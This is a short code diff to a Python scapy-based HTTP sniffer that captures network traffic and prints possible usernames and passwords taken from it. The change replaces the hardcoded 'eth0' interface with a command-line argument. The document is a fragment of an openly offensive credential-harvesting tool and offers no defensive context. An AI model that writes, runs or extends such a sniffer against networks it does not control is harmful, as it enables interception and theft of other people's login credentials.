@@ -2,6 +2,7 @@
 
 import scapy.all as scapy
 from scapy.layers import http
+import argparse
 
 def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
@@ -26,4 +27,8 @@ def process_sniffed_packet(packet):
         if login_info:
             print('\n\n[+] Possible Username/Password > ' + login_info + '\n\n')
 
-sniff('eth0')
+parser = argparse.ArgumentParser()
+parser.add_argument('-i', '--iface', dest='interface', help='Network Interface')
+argument = parser.parse_args()
+print(argument.interface)
+sniff(argument.interface)
